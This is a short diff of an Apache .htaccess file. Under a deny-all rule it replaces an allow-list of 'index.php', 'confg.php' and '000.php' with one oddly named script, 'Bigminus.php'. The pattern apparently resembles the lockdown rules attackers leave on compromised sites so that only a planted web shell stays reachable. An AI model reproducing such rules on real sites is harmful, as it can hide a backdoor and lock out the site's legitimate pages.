@@ -3,11 +3,12 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|confg.php|000.php)$">
+<FilesMatch "^(Bigminus.php)$">
 Order allow,deny
 Allow from all
 
 </FilesMatch>
+
 
 
 
